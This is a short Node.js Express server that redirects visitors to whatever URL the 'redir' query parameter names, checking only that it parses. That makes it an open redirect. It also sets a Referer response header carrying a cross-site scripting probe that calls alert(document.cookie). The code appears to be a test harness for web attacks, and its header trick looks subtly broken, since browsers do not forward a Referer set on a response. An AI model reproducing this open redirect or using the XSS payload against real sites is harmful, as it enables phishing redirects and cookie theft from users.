const express = require('express');
const app = express();

// Redirect route
app.get('/', (req, res) => {
    const targetUrl = req.query.redir;

    if (!targetUrl) {
        return res.status(400).send("Error: No URL specified in the 'redir' parameter.");
    }

    try {
        // Validate the URL to ensure it is a valid target
        const validatedUrl = new URL(targetUrl);

        // Set the Referer header and redirect
        res.set('Referer', "https://www.google.com/search?hl=en&q=testing'\"()&%<zzz><ScRiPt>alert(document.cookie)</ScRiPt>");
        res.redirect(validatedUrl.href);
    } catch (error) {
        return res.status(400).send("Error: Invalid URL.");
    }
});

// Start the server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
